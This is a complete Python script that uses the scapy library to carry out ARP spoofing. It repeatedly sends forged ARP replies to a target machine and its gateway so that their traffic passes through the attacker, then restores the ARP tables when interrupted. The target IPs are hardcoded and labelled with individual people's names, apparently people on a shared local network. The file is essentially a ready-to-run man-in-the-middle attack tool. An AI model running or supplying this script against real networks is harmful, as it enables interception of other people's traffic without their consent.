#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print(answered.show())
    return answered[0][1].hwsrc

# op=2  (Response Packet)
# pdst  (IP Address of the Target)
# hwdst (MAC Address of the Target)
# psrc  (IP Address of the router to pretend the answer came from it so the target will associate our MAC address with the router IP)
def spoof(target_ip, target_mac, spoof_ip):
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# MATEUS target_ip = "10.11.134.148"
target_ip = "10.11.139.218" # Lance
target_mac = get_mac(target_ip)
gateway_ip = "10.11.128.1"
gateway_mac = get_mac(gateway_ip)

try:
    sent_packets = 0

    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        sent_packets = sent_packets + 2
        print("\r[+] Packets sent: " + str(sent_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Restoring ARP tables..... Please wait.")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[-] ARP tables restored ..... Quitting.")
